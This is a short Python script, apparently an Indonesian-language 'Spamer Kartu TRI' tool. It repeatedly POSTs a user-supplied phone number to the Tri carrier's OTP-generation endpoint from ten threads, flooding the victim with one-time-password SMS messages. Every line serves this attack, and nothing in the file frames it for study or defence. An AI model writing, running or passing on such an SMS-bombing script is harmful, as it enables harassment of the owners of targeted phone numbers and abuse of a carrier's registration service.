
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()
os.system('clear')
print("""\033[1;32m
      +---------[ Spamer Kartu TRI ]----------+""")
no = input(" [?] Nomer =>\033[1;33m ")
tot = int(input("\033[1;32m [?] Jumlah =>\033[1;33m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m [!] Sukses Mengirim Spam!")
		else:
			print("\033[1;31m [!] Gagal Mengirim Spam!")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
